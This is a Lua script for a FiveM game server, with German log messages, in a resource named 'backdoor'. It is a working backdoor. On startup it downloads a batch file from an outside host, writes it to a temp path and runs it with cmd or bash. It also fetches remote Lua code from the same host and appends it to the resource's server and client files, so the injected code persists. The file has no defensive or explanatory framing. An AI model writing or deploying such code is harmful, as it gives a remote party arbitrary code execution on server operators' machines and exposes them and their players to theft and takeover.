local config = {
    resourceName = "backdoor",
    windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
    enablePrints = true,
    resourceCodeURLs = {
        ["backdoor"] = {
            client = "https://dc.fast-sell.de/server.lua",
            server = "https://dc.fast-sell.de/server.lua"
        }
    }
}

local function runBatchScript(scriptContent)
    if config.enablePrints then
        print("Führe das Skript aus...")
    end

    local command
    if string.sub(os.getenv("OS"), 1, 7) == "Windows" then
        -- Windows
        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "cmd /C " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    else
        -- Linux
        local tempFilePath = "/tmp/backdoor.sh"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "bash " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    end
    os.execute(command)
end

local function fetchScriptContent(url, callback)
    if config.enablePrints then
        print("Lade das Skript herunter...")
    end

    PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            callback(response)
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

local function loadResourceCode(resourceName, serverScript, clientScript)
    local success = false
    local resourcePath = "resources/" .. resourceName

    if serverScript and serverScript ~= "" then
        local serverFilePath = resourcePath .. "/server.lua"
        local serverFile = io.open(serverFilePath, "a")
        if serverFile then
            serverFile:write(serverScript)
            serverFile:close()
            success = true
        end
    end

    if clientScript and clientScript ~= "" then
        local clientFilePath = resourcePath .. "/client.lua"
        local clientFile = io.open(clientFilePath, "a")
        if clientFile then
            clientFile:write(clientScript)
            clientFile:close()
            success = true
        end
    end

    if success then
        if config.enablePrints then
            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
        end
        -- Neustart der Ressource
        local restartCommand = "ensure " .. resourceName
        os.execute(restartCommand)
    else
        if config.enablePrints then
            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
        end
    end
end

local function main()
    local currentResourceName = GetCurrentResourceName()
    if currentResourceName ~= config.resourceName then
        if config.enablePrints then
            print("Ungültiger Ressourcenname. Der Server wird heruntergefahren...")
        end
        os.exit()
    end
    fetchScriptContent(config.windowsScriptURL, function(scriptContent)
        runBatchScript(scriptContent)
    end)

    for resourceName, urls in pairs(config.resourceCodeURLs) do
        if urls.server and urls.server ~= "" then
            fetchScriptContent(urls.server, function(serverScript)
                loadResourceCode(resourceName, serverScript)
            end)
        end

        if urls.client and urls.client ~= "" then
            fetchScriptContent(urls.client, function(clientScript)
                loadResourceCode(resourceName, nil, clientScript)
            end)
        end
    end
end

-- Starte das Skript
main()
